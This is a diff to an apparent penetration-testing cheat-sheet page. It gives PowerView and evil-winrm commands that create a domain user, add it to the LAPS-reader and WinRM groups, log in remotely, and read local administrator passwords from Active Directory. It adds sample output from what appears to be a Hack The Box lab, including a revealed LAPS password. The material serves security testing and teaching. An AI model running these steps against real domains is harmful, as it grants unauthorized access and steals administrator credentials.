@@ -330,19 +330,49 @@ body.dark-mode #dynamicFormContainer button:hover {
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-import-powerviewps1">1. Import PowerView.ps1</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\programdata&gt; . .\PowerView.ps1
 </span></span></span></code></pre></div><h4 id="2-create-a-cred-object-runas-optional">2. Create a cred object (runas) [optional]</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">username</span> <span class="o">=</span> <span class="s1">&#39;&lt;DOMAIN&gt;\&lt;USER&gt;&#39;</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">password</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">&#39;&lt;PASSWORD&gt;&#39;</span> -AsPlainText -Force
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">cred</span> <span class="o">=</span> new-object -typename System.Management.Automation.PSCredential -argumentlist <span class="nv">$username</span>, <span class="nv">$password</span>
 </span></span></code></pre></div><h4 id="3-create-a-new-user-password-object">3. Create a new user password object</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">new_user_password</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">&#39;&lt;NEW_USER_PASSWORD&gt;&#39;</span> -AsPlainText -Force
-</span></span></code></pre></div><h4 id="4-create-a-new-user-account">4. Create a new user account</h4>
+</span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\programdata&gt; $new_user_password = ConvertTo-SecureString &#39;Test1234&#39; -AsPlainText -Force
+</span></span></span></code></pre></div><h4 id="4-create-a-new-user-account">4. Create a new user account</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">New-AdUser &#39;&lt;NEW_USER&gt;&#39; -enabled $true -accountpassword $new_user_password -Credential $cred
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\programdata&gt; New-AdUser &#39;alice&#39; -enabled $true -accountpassword $new_user_password -Credential $cred
 </span></span></span></code></pre></div><h4 id="5-add-the-new-user-to-laps-group">5. Add the new user to LAPS group</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Add-DomainGroupMember -Identity &#39;LAPS READ&#39; -Members &#39;&lt;NEW_USER&gt;&#39; -Credential $cred
-</span></span></span></code></pre></div><h4 id="6-read-laps-password">6. Read LAPS password</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Run as the new user
-</span></span><span class="line"><span class="cl"><span class="go">Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\programdata&gt; Add-DomainGroupMember -Identity &#39;LAPS READ&#39; -Members &#39;alice&#39; -Credential $cred
+</span></span></span></code></pre></div><h4 id="6-add-the-new-user-to-winrm-group">6. Add the new user to WinRM group</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Add-DomainGroupMember -Identity &#39;WinRM&#39; -Members &#39;&lt;NEW_USER&gt;&#39; -Credential $cred
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\programdata&gt; Add-DomainGroupMember -Identity WinRM -Credential $cred -Members &#39;alice&#39;
+</span></span></span></code></pre></div><h4 id="7-remote-as-new-user">7. Remote as new user</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">evil-winrm -i &lt;TARGET&gt; -u &#39;&lt;NEW_USER&gt;&#39; -p &#39;&lt;NEW_USER_PASSWORD&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> evil-winrm -i 127.0.0.1 -u alice -p <span class="s1">&#39;Test1234&#39;</span>              
+</span></span><span class="line"><span class="cl"><span class="go">                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">Evil-WinRM shell v3.5
+</span></span></span><span class="line"><span class="cl"><span class="go">                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+</span></span></span><span class="line"><span class="cl"><span class="go">                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span></span><span class="line"><span class="cl"><span class="go">                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">Info: Establishing connection to remote endpoint
+</span></span></span><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\alice\Documents&gt; 
+</span></span></span></code></pre></div><h4 id="8-read-laps-password">8. Read LAPS password</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\alice\Documents&gt; Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">DistinguishedName : CN=PIVOTAPI,OU=Domain Controllers,DC=LicorDeBellota,DC=htb
+</span></span></span><span class="line"><span class="cl"><span class="go">DNSHostName       : PivotAPI.LicorDeBellota.htb
+</span></span></span><span class="line"><span class="cl"><span class="go">Enabled           : True
+</span></span></span><span class="line"><span class="cl"><span class="go">ms-Mcs-AdmPwd     : 82SD67Cuq34TPZm4mnFo
+</span></span></span><span class="line"><span class="cl"><span class="go">Name              : PIVOTAPI
+</span></span></span><span class="line"><span class="cl"><span class="go">ObjectClass       : computer
+</span></span></span><span class="line"><span class="cl"><span class="go">ObjectGUID        : 98783674-e6a3-4d9e-87e3-efe5f31fabbf
+</span></span></span><span class="line"><span class="cl"><span class="go">SamAccountName    : PIVOTAPI$
+</span></span></span><span class="line"><span class="cl"><span class="go">SID               : S-1-5-21-842165252-2479896602-2762773115-1004
+</span></span></span><span class="line"><span class="cl"><span class="go">UserPrincipalName :
 </span></span></span></code></pre></div></div></p>
 
 </div></div>
